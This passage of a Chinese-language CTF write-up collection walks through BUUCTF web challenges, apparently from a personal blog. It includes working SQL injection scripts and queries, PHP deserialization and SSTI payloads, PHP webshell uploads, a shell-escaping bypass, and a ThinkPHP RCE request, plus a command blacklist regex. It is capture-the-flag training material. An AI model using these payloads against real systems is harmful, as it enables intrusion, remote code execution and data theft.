$flag;\n}\n```\n\n这一有一些不同的是md5比较使用了`===`不仅比较类型还比较值。但是md5有一个：\n\n```\nmd5([1,2,3]) == md5([4,5,6]) == NULL\n```\n\n所以传入两个数组，又能保证两个变量不相等，md5加密有都是NULL且类型是数组类型，注意数组里的值还是不可以一样的。\n\n```\nparam1[]=1&param2[]=2\n```\n\n---\n\n# [ZJCTF 2019]NiZhuanSiWei\n\n源码\n\n```\n<?php  \n$text = $_GET[\"text\"];\n$file = $_GET[\"file\"];\n$password = $_GET[\"password\"];\nif(isset($text)&&(file_get_contents($text,'r')===\"welcome to the zjctf\")){\n    echo \"<br><h1>\".file_get_contents($text,'r').\"</h1></br>\";\n    if(preg_match(\"/flag/\",$file)){\n        echo \"Not now!\";\n        exit(); \n    }else{\n        include($file);  //useless.php\n        $password = unserialize($password);\n        echo $password;\n    }\n}\nelse{\n    highlight_file(__FILE__);\n}\n?>\n```\n\n先来一段[PHP伪协议总结](https://segmentfault.com/a/1190000018991087)，这题的第一步是判断传入text参数并读取内容，判断内容为**welcome to the zjctf**，使用`data://`伪协议。\n\n```\n?text=data://text/plain,welcome to the zjctf\n```\n\n接下来是文件包含，有了提示`useless.php`肯定要读一读看看，使用`php://filter`伪协议。\n\n```\n?text=data://text/plain,welcome to the zjctf&file=php://filter/convert.base64-encode/resource=useless.php\n```\n\n得到的内容\n\n```\n<?php  \n\nclass Flag{  //flag.php  \n    public $file;  \n    public function __tostring(){  \n        if(isset($this->file)){  \n            echo file_get_contents($this->file); \n            echo \"<br>\";\n        return (\"U R SO CLOSE !///COME ON PLZ\");\n        }  \n    }  \n}  \n?>  \n```\n\n并且文件包含下面有一个反序列化，又看到了`__tostring`函数，**当一个对象被当作字符串对待的时候，会触发这个魔术方法**。我构造的对象\n\n```\n<?php \nclass Flag{  \n    public $file=\"flag.php\";  \n}\n\n$f = new Flag();\necho serialize($f);\n\n//O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";}\n```\n\n在传入对象之前当然要把读取文件流改为正常包含文件了。最终payload\n\n```\n?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";}\n```\n\n---\n\n\n\n# [CISCN2019 华北赛区 Day2 Web1]Hack World\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307171921.png)\n\n很明显的sql注入，随便尝试一些语句有\n\n> 1\t>>\tHello, glzjin wants a girlfriend.\n>\n> 2\t>>\tDo you want to be my girlfriend?\n>\n> 3之后都是\t>>\tError Occured When Fetch Result.\n\n输入一个单引号`1'`出现了`bool(false)`，是一个布尔类型返回，就很有可能是盲注之类的。测试的时候还发现空格被过滤了，空格被过滤可以尝试使用TAB制表符代替。\n\n题目中也有提示\n\n> ### All You Want Is In Table 'flag' and the column is 'flag'\n\n说明flag在flag表的flag字段中。以下是一个布尔盲注的脚本，思路就是查询flag的值使用`substr`函数每次截取一个字符，获得其`ascii`值再使用二分法确定具体的值，最后拼接输出。\n\n```python\nimport requests\nimport time\n\nurl = 'http://26670c55-697e-4520-ae0a-bd23a786cd72.node3.buuoj.cn/'\nresult = ''\n\nfor x in range(1, 50):\n\thigh = 127\n\tlow = 32\n\tmid = (low + high) // 2\n\twhile high>low:\n\t\tpayload = \"if(ascii(substr((select\tflag\tfrom\tflag),%d,1))>%d,1,2)\" % (x, mid)\n\t\tdata = {\n\t\t\t\"id\":payload\n\t\t}\n\t\ttime.sleep(0.3)\n\t\tresponse = requests.post(url, data = data)\n\t\tif 'Hello' in response.text:\n\t\t\tlow=mid+1\n\t\telse:\n\t\t\thigh = mid\n\t\tmid = (low+high)/2\n\n\tresult += chr(int(mid))\n\tprint(result)\n\t\n#flag{929c8993-2d85-4fbf-8e48-7c457551105e}\n```\n\n---\n\n# [极客大挑战 2019]HardSQL\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307173126.png)\n\n还是sql注入题。尝试在输入框里输入`#`、`--+`时被拦下了，但是在url中使用%23通过了。尝试了union但是被过滤了，使用双写也不通过，和这道题同类型的题前面有Baby SQL、Easy SQL，考点还剩下的有盲注、报错注入、堆叠注入。尝试报错注入可以使用，我参考的[十种MySQL报错注入](https://www.cnblogs.com/wocalieshenmegui/p/5917967.html)。还需要注意空格是会被拦下的，url编码也不能通过，所以在语句中的表名需要使用`()`隔开，具体payload如下：\n\n1. 爆表\n\n```sql\n?username=admin%27or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e)))%23&password=1\n```\n\n当前表名是：H4rDsq1\n\n2. 爆字段\n\n```sql\n?username=admin%27or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e)))%23&password=1\n```\n\n当前表的字段有：id,username,password\n\n1. 出数据\n\n如果使用正常的查询语句会因为flag的长度太长，页面中的回显长度不能显示全，但是可以使用`left`和`right`函数：\n\n> 语法：LEFT(ARG,LENGTH)、RIGHT(ARG,LENGTH)\n\n这两个函数会用到选取的长度，如果想要拼成一个完整的flag，可以先用length查看总长度，计算以后拼一下\n\n```sql\n?username=admin%27or(extractvalue(1,concat(0x7e,(select(left(password,35))from(H4rDsq1)),0x7e)))%23&password=1\n```\n\nflag{112bb5db-17a4-47e2-97b4-19\n\n```sql\n?username=admin%27or(extractvalue(1,concat(0x7e,(select(right(password,11))from(H4rDsq1)),0x7e)))%23&password=1\n```\n\ndc295a017f}\n\n---\n\n\n\n# [网鼎杯 2018]Fakebook\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307174819.png)\n\n是一个展示自己博客网址的列表，先随便注册一个\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307175313.png)\n\n我填的是baidu的网址23333。这时的url是：\n\n```url\nhttp://2cefe2a5-4e68-44ce-870c-3628c2500cd3.node3.buuoj.cn/view.php?no=1\n```\n\n看到了no=1，应该想到了sql注入，我没有试出什么名堂，但是在网上找到了一个这道题的非预期解：[[网鼎杯2018\\]fakebook题解](https://www.cnblogs.com/kevinbruce656/p/12643338.html)，使用了`load_file`函数直接读取了flag文件。同样是空格被过滤，但是可以使用`/**/`绕过。\n\n## 非预期解\n\n```code\n?no=-1 union/**/select 1,2,3,4\n```\n\n先使用上面的语句查看回显点。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307180356.png)\n\n找的了位置2的回显点，可以把函数替换在2的位置上。\n\n```code\n?no=-1 union/**/select 1,load_file('/var/www/html/flag.php'),3,4\n```\n\n参考师傅的博客中是使用了盲注获得flag的，其实执行以后使用页面的选取工具选取回显的标签块，可以在注释里找的到🤣\n\n## 预期解\n\n正常的sql注入一套查询，同样是使用`/**/`绕过空格过滤。\n\n爆表\n\n```code\n?no=-1%20union/***/select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=database()%23\n```\n\n爆字段\n\n```code\n?no=-1 union/***/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users' %23\n```\n\n出数据\n\n```code\n?no=-1 union/***/select 1,group_concat(no,username,passwd,data),3,4 from users\n```\n\n查询的结果是一大串字符串，但是在结尾一个PHP的序列化对象：\n\n```code\nO:8:\"UserInfo\":3:{s:4:\"name\";s:7:\"guobang\";s:3:\"age\";i:18;s:4:\"blog\";s:20:\"http://www.baidu.com\";}\n```\n\n说明网站是使用反序列化获取对应栏的数据，下面有一个iframe的标签，根据提示**the contents of his/her blog**，得知我们提供的网址会在这里显示，正好有一个php伪协议file://可以读取本地文件，思路就是：**使用伪协议读取flag作为blog网站回显在iframe的标签中**，所以构造一个序列化对象。 \n\n```php\n<?php\n\nclass UserInfo\n{\n    public $name = \"guobang\";\n    public $age = 18;\n    public $blog = \"file:///var/www/html/flag.php\";\n}\n\n$s = new UserInfo();\necho serialize($s);\n\n//O:8:\"UserInfo\":3:{s:4:\"name\";s:7:\"guobang\";s:3:\"age\";i:18;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}\n```\n\n最终payload\n\n```code\n?no=-1%20union/***/select%201,2,3,'O:8:\"UserInfo\":3:{s:4:\"name\";s:7:\"guobang\";s:3:\"age\";i:18;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}' from%20users\n```\n\n在iframe里面找，是一个data:text/html的数据格式，base64加密的噢。\n\n---\n\n# [网鼎杯 2020 青龙组]AreUSerialz\n\n部分图\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308102316.png)\n\n最下面有对于payload的限制：\n\n```php\nfunction is_valid($s) {\n    for($i = 0; $i < strlen($s); $i++)\n        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))\n            return false;\n    return true;\n}\nif(isset($_GET{'str'})) {\n\n    $str = (string)$_GET['str'];\n    if(is_valid($str)) {\n        $obj = unserialize($str);\n    }\n\n}\n```\n\n需要payload中的字符ascii码值`大于`32`小于`125。注意到最后有一个`unserialize`函数，判断这道题考点是反序列化。接下来分析源码：\n\n* `process()`函数判断op的值，如果是`1`就写入文件，如果是`2`就读取文件。代码开头包含了`flag.php`文件，所以推测需要使用2操作数读取flag.php文件。\n* `write()`把对象中的`$content`属性值写入到`$filename`文件中，如果长度大于100会被拦下。\n* `read()`使用**file_get_contents()**函数读取文件。**正是我们想要的**。\n* `output()`输出内容。\n* `__destruct()`对象销毁时会执行的函数，需要注意的是**if**判断里的`$this->op === \"2\"`是强比较，并且会修改op的值为1（写文件），因为**\"2\"**是一个字符串类型的如果传入**整型的2**即可绕过。\n\n所以我们构造一个对象**op**为2，**filename**为flag.php即可，读文件的时候肯定不是\n\n接下来是反序列化时会遇到的问题，因为对象中属性的修饰是`protected`，序列化时需要保证一致的。\n\n先给出自己创建的对象源码\n\n```php\n<?php\nclass FileHandler {\n\n    protected  $op=2;\n    protected  $filename=\"/var/www/html/flag.php\";\n    protected  $content;\n}\n\n$c = new FileHandler();\necho serialize($c);\n```\n\n1. PHP7.1以上版本对属性类型不敏感、用public绕过:\n\n```code\nO:11:\"FileHandler\":3:{s:2:\"op\";i:2;s:8:\"filename\";s:22:\"/var/www/html/flag.php\";s:7:\"content\";N;}\n```\n\n运行以后可以在网页注释中找到文件。绝对路径读取也可以，我第一次使用php://filter读再去解码也成功了。\n\n```code\nO:11:\"FileHandler\":3:{s:2:\"op\";i:2;s:8:\"filename\";s:52:\"php://filter/convert.base64-encode/resource=flag.php\";s:7:\"content\";N;}\n```\n\n2. 序列化字符串中s替换为S，支持字符串用16进制，\n\n```code\nO:11:\"FileHandler\":3:{S:5:\"\\00*\\00op\";i:2;S:11:\"\\00*\\00filename\";S:22:\"/var/www/html/flag.php\";S:10:\"\\00*\\00content\";N;}\n```\n\n\n\n思路：https://blog.csdn.net/Oavinci/article/details/106998738\n\n---\n\n# [MRCTF2020]你传你🐎呢\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308104930.png)\n\n测试后缀，php、phtml都被过滤了，htaccess可以，先传上特供的`.htaccess`\n\n```code\nSetHandler application/x-httpd-php\n```\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308105247.png)\n\n传图片马，我一直用的是GIF马，几次尝试都没通过，后来修改了`Content-Type: image/jpeg`可以了，说明Content-Type是GIF还不行，接下来直接传图片码\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308105652.png)\n\n根据地址访问图片马的地址，使用system读文件还没成，用蚁剑连了执行执行ret=127,disable_function了\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110126.png)\n\n不过根目录下的flag文件还是可以正常读取，至于disable_function可以参考[【极客大挑战 2019】RCE ME](https://braindance.tk/2020/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/)。\n\n---\n\n# [BJDCTF 2nd]fake google\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110510.png)\n\n就一个输入框，随便输入一个去看看，跳转以后\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110545.png)\n\n注释里有提示ssti，应该是模板注入，就在网上搜一个ssti的payload试试[SSTI (服务器模板注入)](https://blog.csdn.net/qq_40657585/article/details/83657220)\n\n\n\n\n\n找到了一个直接读文件的payload\n\n```code\n?name={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/flag', 'r').read() }}{% endif %}{% endfor %}\n```\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110717.png)\n\n---\n\n# [GYCTF2020]Blacklist\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110821.png)\n\nsql注入，先试一试堆叠注入，可以执行，尝试select的时候返回了过滤内容\n\n```php\nreturn preg_match(\"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\",$inject);\n```\n\n前面还有一个堆叠注入的是新姿势**[强网杯 2019]随便注**，一种是使用prepare预处理语句，另一种是修改表名，根据上面的过滤内容，两种方法都被过滤了。先试试查看表：\n\n```sql\n-1';show tables;\n\nFlagHere\nwords\n```\n\n查看表结构：\n\n```sql\n-1';desc `FlagHere`;\n```\n\n接下来是看的wp，学到了个新姿势：使用`HANDLER ... OPEN`语句，贴一个[官方文档](https://dev.mysql.com/doc/refman/8.0/en/handler.html)。\n\n`HANDLER ... OPEN`语句打开一个表，使其可以使用后续`HANDLER ... READ`语句访问，该表对象未被其他会话共享，并且在会话调用`HANDLER ... CLOSE`或会话终止之前不会关闭\n\n```sql\n-1';handler FlagHere open;handler FlagHere read first;handler FlagHere close\n```\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308111414.png)\n\n---\n\n# [强网杯 2019]高明的黑客\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308112326.png)\n\n下载源码以后一堆不可读的源码，但是里面有很多shell，看不懂所以找了wp，思路就是用脚本匹配文件中的shell，然后传参试一试每一个shell是否能用，抄脚本\n\n```python\n# codeing = utf-8\n\nimport  requests\nimport os\nimport re\nimport threading\nimport time\n\nrequests.adapters.DEFAULT_RETRIES = 8\nsession = requests.session()\nsession.keep_alive = False\n\nsem=threading.Semaphore(30)\n\nurl=\"http://84fa677d-e4dd-47a1-9124-1823cc996d12.node3.buuoj.cn/\"\n\npath = \"D:\\DROPS\\phpstudy_pro\\WWW\\ctf\\src\\\\\"\nfileNames = os.listdir(path)\n\nrrGET = re.compile(r\"\\$_GET\\[\\'(\\w+)\\'\\]\")\nrrPOST = re.compile(r\"\\$_POST\\[\\'(\\w+)\\'\\]\")\n\nlocal_file = open(\"flag.txt\",\"w\",encoding=\"utf-8\")\n\ndef run(fileName):\n    with sem:\n        file = open(path+fileName,'r',encoding='utf-8')\n        content = file.read()\n        print(\"[+]checking: %s\"%fileName)\n\n        #GET\n        for i in rrGET.findall(content):\n            r = session.get(url+\"%s?%s=%s\"%(fileName,i,\"echo ~guobanghhh~\"))\n            if \"~guobanghhh~\" in r.text:\n                flag = fileName + \"中的\" + i + \"可以用！！！\"\n                print(flag)\n                local_file.write(flag)\n\n        #POST\n        # for i in rrPOST.findall(content):\n        #     r = session.post(url+fileName,data={i:\"echo ~guobanghhh~\"})\n        #     if \"~guobanghhh~\" in r.text:\n        #         flag = fileName + \"中的\" + i + \"可以用！！！\"\n        #         print(flag)\n        #         local_file.write(flag)\n\nif __name__ == '__main__':\n    run(\"xk0SzyKwfzw.php\")\n    start_time = time.time()  # 开始时间\n    print(\"[start]程序开始:\" + str(start_time))\n    thread_list = []\n    for fileName in fileNames:\n        t = threading.Thread(target=run,args=(fileName,))\n        thread_list.append(t)\n    for t in thread_list:\n        t.start()\n    for t in thread_list:\n        t.join()\n\n```\n\n结果就是访问\n\n```url\nhttp://dd1c66d5-66b2-4b82-a2a8-bf7bfbecdd97.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag\n```\n\n获得flag\n\n---\n\n# [MRCTF2020]Ez_bypass\n\n不截图了，主页没有代码格式，贴一个源码\n\n```php\nI put something in F12 for you\ninclude 'flag.php';\n$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';\nif(isset($_GET['gg'])&&isset($_GET['id'])) {\n    $id=$_GET['id'];\n    $gg=$_GET['gg'];\n    if (md5($id) === md5($gg) && $id !== $gg) {\n        echo 'You got the first step';\n        if(isset($_POST['passwd'])) {\n            $passwd=$_POST['passwd'];\n            if (!is_numeric($passwd))\n            {\n                 if($passwd==1234567)\n                 {\n                     echo 'Good Job!';\n                     highlight_file('flag.php');\n                     die('By Retr_0');\n                 }\n                 else\n                 {\n                     echo \"can you think twice??\";\n                 }\n            }\n            else{\n                echo 'You can not get it !';\n            }\n\n        }\n        else{\n            die('only one way to get the flag');\n        }\n}\n    else {\n        echo \"You are not a real hacker!\";\n    }\n}\nelse{\n    die('Please input first');\n}\n}Please input first\n```\n\n分析一波：\n\n* 第7行是第一层需要md5的值相同但是两个变量不同，需要注意是强比较`===`噢。\n* 第11、17行判断passwd是非数字并且若比较`==`等于1234567\n\n第一个利用数组即可绕过\n\n```code\nmd5([1,2,3]) == md5([4,5,6]) == NULL\n```\n\n第二个利用比较时会进行类型转换，字符串`1234567a`会被强制转换类型为整型的`1234567`\n\npayload\n\n```code\n?id[]=1&gg[]=2\n\nPOST\npasswd=1234567a\n```\n\n\n\n---\n\n# [BUUCTF 2018]Online Tool\n\n源码\n\n```php\n<?php\n\nif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {\n    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];\n}\n\nif(!isset($_GET['host'])) {\n    highlight_file(__FILE__);\n} else {\n    $host = $_GET['host'];\n    $host = escapeshellarg($host);\n    $host = escapeshellcmd($host);\n    $sandbox = md5(\"glzjin\". $_SERVER['REMOTE_ADDR']);\n    echo 'you are in sandbox '.$sandbox;\n    @mkdir($sandbox);\n    chdir($sandbox);\n    echo system(\"nmap -T5 -sT -Pn --host-timeout 2 -F \".$host);\n}\n```\n\n最后有一个system函数，但是使用的nmap的指令，经过一番搜索得知了nmap可以把结果存储在文件里，所以这道题也是道RCE。还有两个没见过的函数`escapeshellarg`、`escapeshellcmd`。\n\n这道题利用了两个点\n\n1. nmap可以将扫描的结果存储在文件里。使用方法：[Nmap扫描结果的保存和输出](https://blog.csdn.net/weixin_34221036/article/details/92148628)\n\n2. escapeshellarg+escapeshellcmd同时使用有一些漏洞\n\n   > [谈谈escapeshellarg参数绕过和注入的问题](http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/)\n   >\n   > [PHP escapeshellarg()+escapeshellcmd() 之殇](https://paper.seebug.org/164/)\n\n参考博客整理一下这两个处理命令的函数同时使用时的问题：\n\n1. 假如传入的参数为`172.17.0.2' -v -d a=1`\n2. 首先经过`escapeshellarg`函数，这个函数会把单独的单引号`'`加上转义符`\\`并使用单引号`'`括起来，再使用单引号`'`把整个参数括起来。这时候的参数是`'172.17.0.2'\\'' -v -d a=1'`\n3. 再进入`escapeshellcmd`函数，这个函数（从左至右会把落单的符号直接加转义符，其他什么都不做）遇到成对匹配的单引号`'`不过处理，转义符`\\`再使用转义符转义，再略过一个成对的单引号`''`，最后一个单引号`'`再使用转义符转义。这时候的参数就成了`'172.17.0.2'\\\\'' -v -d a=1\\'`\n4. 最后执行的参数是`'172.17.0.2'\\\\'' -v -d a=1\\'`，由于中间的`\\\\`被解释为`\\`而不再是转义字符，所以后面的`'`没有被转义，与再后面的`'`配对儿成了一个空白符。所以可以简化为` 172.17.0.2\\ -v -d a=1'`\n\n所以构造payload：\n\n```code\n'<?php eval($_POST[_]) ?> -oG 1.php '\n```\n\n经过`escapeshellarg`函数会被解析成为：`''\\''<?php eval($_POST[_]) ?> -oG 1.php '\\'''`\n\n再经过`escapeshellcmd`函数会被解析为：`''\\\\''<?php eval($_POST[_]) ?> -oG 1.php '\\\\'''`\n\n注意最后单引号前面的那个空格很重要，如果是紧挨着的话文件名称就成了`1.php\\`不在是php文件了。所以我们的payload最终在服务器端是：`\\<?php eval($_POST[_]) ?> -oG 1.php \\ `。\n\n加空格目的是为了防止文件名后缀中出现符号，加上空格就会舍去。\n\n```php\n<?php\n$host = \"'<?php eval($_POST[_]) ?> -oG 1.php '\";\necho $host.\"\\n\";\n$host = escapeshellarg($host);\necho $host.\"\\n\";\n$host = escapeshellcmd($host);\necho $host.\"\\n\";\n\n```\n\n结果：\n\n```code\n'<?php eval() ?> -oG 1.php '\n''\\''<?php eval() ?> -oG 1.php '\\'''\n''\\\\''\\<\\?php eval\\(\\) \\?\\> -oG 1.php '\\\\'''\n```\n\n最终请求payload\n\n```\n/?host='<?php eval($_POST[_]) ?> -oG 1.php '\n```\n\n执行指令时会创建一个sandbox文件夹，访问`$sandbox$/1.php`，POST传参\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110615.png)\n\n```\n_=system('cat /flag');\n```\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110726.png)\n\n\n\n---\n\n# [RoarCTF 2019]Easy Java\n\n是java写的web程序\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110821.png)\n\n考点是**WEB-INF/web.xml泄露**\n\n> WEB-INF主要包含一下文件或目录: \n>\n> /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。\n>\n> /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 \n>\n> /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 \n>\n> /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。 \n>\n> /WEB-INF/database.properties：数据库配置文件 \n>\n> 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码\n\n重点不在登陆界面，而是那个Help按钮，可以下载文件。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110934.png)\n\n首先尝试去读web.xml文档，添加POST请求\n\n```\nfilename=WEB-INF/web.xml\n```\n可以读取web.xml文件：\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\">\n\n    <welcome-file-list>\n        <welcome-file>Index</welcome-file>\n    </welcome-file-list>\n\n    <servlet>\n        <servlet-name>IndexController</servlet-name>\n        <servlet-class>com.wm.ctf.IndexController</servlet-class>\n    </servlet>\n    <servlet-mapping>\n        <servlet-name>IndexController</servlet-name>\n        <url-pattern>/Index</url-pattern>\n    </servlet-mapping>\n\n    <servlet>\n        <servlet-name>LoginController</servlet-name>\n        <servlet-class>com.wm.ctf.LoginController</servlet-class>\n    </servlet>\n    <servlet-mapping>\n        <servlet-name>LoginController</servlet-name>\n        <url-pattern>/Login</url-pattern>\n    </servlet-mapping>\n\n    <servlet>\n        <servlet-name>DownloadController</servlet-name>\n        <servlet-class>com.wm.ctf.DownloadController</servlet-class>\n    </servlet>\n    <servlet-mapping>\n        <servlet-name>DownloadController</servlet-name>\n        <url-pattern>/Download</url-pattern>\n    </servlet-mapping>\n\n    <servlet>\n        <servlet-name>FlagController</servlet-name>\n        <servlet-class>com.wm.ctf.FlagController</servlet-class>\n    </servlet>\n    <servlet-mapping>\n        <servlet-name>FlagController</servlet-name>\n        <url-pattern>/Flag</url-pattern>\n    </servlet-mapping>\n\n</web-app>\n```\n\n注意到了一个`FlagController`的控制器，它所在的类为`com.wm.ctf.FlagController`，前面也提到了编译文件所在的文件夹`/WEB-INF/classes/`，去这个文件夹下载`FlagController`相关的文件，还需要知道的是：Javaweb程序编译文件的目录结构是根据类名创建的，类名我们也知道了，所以下载：\n\n```code\nfilename=WEB-INF/classes/com/wm/ctf/FlagController.class\n```\n\nclass文件源码好多不可见字符\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310112205.png)\n\n我选中的那段就是flag在的地方，看到了`==`就应该意识到是base64编码，但是base64编码里没有`<`这个字符，所以flag的密文就是\n\n```code\nZmxhZ3s0NmNhMTExMS01ZjI5LTQwYjMtYjUwMC1lYWMzZjkyMjU4ODF9Cg==\n```\n\n\n\n---\n\n#  -----------------------以下部分施工中👷‍♂️------------------------\n\n下面的都是没有整理，先把重要思路写下来了，然后有时间再配图\n\n---\n\n# [GKCTF2020]cve版签到\n\n[CVE-2020-7066](https://blog.csdn.net/qq_45521281/article/details/106425266)\n\n只有一个按钮，点击以后查看网页的Network请求中有一个\n\n> Hint: Flag in localhost\n\n且utl地址中有可控的参数，所以应该是使用ssrf。这里还有一个提示是在主页面那里\n\n>You just view *.ctfhub.com\n\n只可以访问以ctfhub.com结尾的网站，再根据cve使用%00截断访问：\n\n```\n?url=http://127.0.0.1%00.ctfhub.com\n```\n\n第二个提示：\n\n> Host must be end with '123'\n\n必须以123结尾，所以最终payload\n\n```\n?url=http://127.0.0.123%00.ctfhub.com\n```\n\n\n\n---\n\n# [GXYCTF2019]禁止套娃\n\ngit泄露。我使用的https://github.com/gakki429/Git_Extract\n\n```\n<?php\ninclude \"flag.php\";\necho \"flag在哪里呢？<br>\";\nif(isset($_GET['exp'])){\n    if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) {\n        if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) {\n            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {\n                // echo $_GET['exp'];\n                @eval($_GET['exp']);\n            }\n            else{\n                die(\"还差一点哦！\");\n            }\n        }\n        else{\n            die(\"再好好想想！\");\n        }\n    }\n    else{\n        die(\"还想读flag，臭弟弟！\");\n    }\n}\n// highlight_file(__FILE__);\n?>\n\n```\n\n正则表达式匹配的只有函数的形式如`var_dump();`是一道[无参数RCE](https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/)，看的题解自己整理的payload：\n\n```\n?exp=var_dump(readfile(array_rand(array_flip(scandir(current(localeconv()))))));\n```\n\n一层一层解释：\n\nlocaleconv() 函数返回一包含本地数字及货币格式信息的数组\n\n**图片展示**\n\ncurrent() 返回数组中的当前单元, 默认取第一个值。别名pos()\n\n到这里获得的是一个点\n\n\n\nscandir() 遍历目录，是`.`的话就是列出当前目录。\n\n此时输出：\n\n```\narray(5) { [0]=> string(1) \".\" [1]=> string(2) \"..\" [2]=> string(4) \".git\" [3]=> string(8) \"flag.php\" [4]=> string(9) \"index.php\" }\n```\n\n这时的输出还是键值对的形式，我们需要使用`array_flip()`函数交换键值对，然后使用随机函数`array_rand()`从数组中随机取出一个或多个单元。因为正则的原因无法使用`file_get_contents()`，但是还有其他读取文件的函数:readfile()、highlight_file()和它的别名函数show_source()。\n\n\n\n---\n\n# [GXYCTF2019]BabyUpload\n\nph过滤，image/gif不能通过。image/jpe可以\n\n上传.htaccess\n\n```\nSetHandler application/x-httpd-php\n```\n\n上传码，但是不能是php代码，使用js\n\n```\n<script language=\"php\">eval($_REQUEST[shell])</script>\n```\n\n完工\n\n---\n\n# [BJDCTF 2nd]old-hack\n\nThinkPHP的[漏洞](https://blog.csdn.net/qq_38807738/article/details/86777541)\n\nThinkPHP5 5.0.23\n\n```\n_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=cat /flag\n```\n\n\n\n---\n\n# [安洵杯 2019]easy_web\n\n看url一个img和cmd，页面中有一个图片的标签，和一个**md5 is funny ~**。把url中img的值进行解码发现图片名为`555.png`，尝试用同样的编码方式读取index.php，加密的编码依次为：hex-->base64-->base64。\n\nindex.php\n\n```\n<?php\nerror_reporting(E_ALL || ~ E_NOTICE);\nheader('content-type:text/html;charset=utf-8');\n$cmd = $_GET['cmd'];\nif (!isset($_GET['img']) || !isset($_GET['cmd'])) \n    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');\n$file = hex2bin(base64_decode(base64_decode($_GET['img'])));\n\n$file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file);\nif (preg_match(\"/flag/i\", $file)) {\n    echo '<img src =\"./ctf3.jpeg\">';\n    die(\"xixi～ no flag\");\n} else {\n    $txt = base64_encode(file_get_contents($file));\n    echo \"<img src='data:image/gif;base64,\" . $txt . \"'></img>\";\n    echo \"<br>\";\n}\necho $cmd;\necho \"<br>\";\nif (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|<|>/i\", $cmd)) {\n    echo(\"forbid ~\");\n    echo \"<br>\";\n} else 